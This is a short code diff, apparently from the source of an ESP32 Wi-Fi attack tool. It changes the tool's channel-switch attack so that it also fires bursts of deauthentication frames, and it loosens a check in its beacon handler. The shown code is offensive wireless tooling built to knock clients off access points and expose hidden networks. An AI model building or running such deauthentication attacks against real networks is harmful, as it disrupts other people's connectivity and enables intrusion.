@@ -359,7 +359,7 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
     // of Hidden Networks when clients reconnect following a CSA/Deauth attack.
     if (subtype == MGMT_SUB_BEACON || subtype == MGMT_SUB_PROBE_RESP) {
         _stats.beacons++;
-        if (!_apFoundCb || len < 12) return;
+        if (len < 12) return;
 
         const uint8_t *ie     = payload + 12;
         uint16_t       ie_len = (len > 12) ? len - 12 : 0;
@@ -1001,7 +1001,9 @@ void Politician::_processFishing() {
         }
         if (_attackMask & ATTACK_CSA) {
             _log("[Attack] Switching to CSA\n"); esp_wifi_set_channel(_fishChannel, WIFI_SECOND_CHAN_NONE);
-            _sendCsaBurst(); _fishState = FISH_CSA_WAIT; _probeLocked = true; _probeLockEndMs = millis() + _cfg.csa_wait_ms; _csaSecondBurstSent = false;
+            _sendCsaBurst();
+            if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst(_cfg.csa_deauth_count);
+            _fishState = FISH_CSA_WAIT; _probeLocked = true; _probeLockEndMs = millis() + _cfg.csa_wait_ms; _csaSecondBurstSent = false;
         } else {
             _fishState = FISH_IDLE; _probeLocked = false; _lastHopMs = millis();
             _log("[Fish] Exhausted\n");
